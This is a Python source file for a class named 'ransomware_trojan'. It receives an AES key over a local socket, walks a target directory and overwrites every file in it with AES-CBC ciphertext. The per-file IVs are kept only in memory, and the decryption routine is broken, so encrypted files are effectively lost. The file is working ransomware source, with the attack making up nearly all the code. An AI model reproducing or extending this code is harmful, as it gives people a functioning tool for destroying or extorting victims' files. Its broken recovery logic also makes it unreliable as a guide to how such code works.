import socket
from Cryptodome.Cipher import AES
import base64, os
from Cryptodome.Util.Padding import pad
import json
from base64 import b64encode
from Cryptodome.Random import get_random_bytes
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
from base64 import b64decode
import secrets
import os


host='127.0.0.1'
port=8080

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((host, port))

# key = b'i\xc23\x17\xc3\xb2\x89\xc2\xab\x1c^\x7f\t%z.' 
key = client_socket.recv(1024) # AES requires keys of specific lengths (16, 24, or 32 bytes)


print("key: " + str(key.hex()))
def generate_iv():
    iv = secrets.token_bytes(16)  # Returns a bytes object of the specified length
    print(iv)
    return iv   
fixed_iv = "JAH3rdHjwKfO730X0vwWoA==" #generate_iv() 

iv_mapping = {}
class ransomware_trojan:
    def __init__(self, key) -> None:
        self.key = key
        self.iv = "JAH3rdHjwKfO730X0vwWoA=="

    def encrypt(self, data):
        cipher = AES.new(key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data, AES.block_size))
        iv = b64encode(cipher.iv).decode('utf-8')
        print(iv)
        ct = b64encode(ct_bytes).decode('utf-8')
        result = json.dumps({'iv':iv, 'ciphertext': ct})
        iv_mapping.update({'iv':iv, 'ciphertext': ct})
        return ct_bytes
    
    def read_file(self, path):
        with open(path, "rb") as file:
            file_contant = file.read()
            return file_contant
    
    def write_file(self, path, file_contant):
        with open(path, 'wb') as file:
            file.write(file_contant)


    
    def encrypt_file(self, file_path):
        file_contant = self.read_file(file_path)
        encrpyted_file_contant = self.encrypt(file_contant)
        self.write_file(file_path ,encrpyted_file_contant)

    # def dcrypt_file(self, file_path):
    #     file_contant = self.read_file(file_path)
    #     encrpyted_file_contant = self.decrypt()
    #     self.write_file(file_path ,encrpyted_file_contant)

    def iterating(self, target_path, function):
        for subdir, dirs, files in os.walk(target_path):
            for file in files:
                print(os.path.join(subdir, file))
                file_path = os.path.join(subdir, file)
                function(file_path)

                
                


    def decrypt(self, key, json_text):
        try:
            with open("iv_mapping.json", 'w') as file:
                json.dump(iv_mapping, file, indent=4)
            b64 = json.loads(json_text)
            iv = b64decode(b64['iv'])
            ct = b64decode(b64['ciphertext'])
            cipher = AES.new(key, AES.MODE_CBC, iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size)
            result = pt.decode("ascii")
            self.write_file(result)
            return result
        except(ValueError, KeyError):
            print("Incorrect decryption")

    # cipher = AES.new(Key, AES.MODE_EAX, nonce= nonce)
    # plain_text = cipher.decrypt(cipher_text)
    # try:
    #     cipher.verify(tag)
    #     return plain_text.decode("ascii")
    # except:
    #     return False

trojan = ransomware_trojan(key)
#print(trojan.decrypt(key, encrypted_text, ))
#print(trojan.iterating(r"C:\Users\user1\Desktop\encrypt me"))
#trojan.attack(r"C:\Users\user1\Desktop\encrypt me", trojan.encrypt())
#print(decrypt(fixed_nonce, b'\xbb \x17\x11\xd5', b'\xa6\xd4\xdf\xdd[\x9e\xd5\xdft\xa0\x1eD\xb7\xffxE'))
trojan.iterating(r"C:\Users\user1\Desktop\encrypt me", trojan.encrypt_file)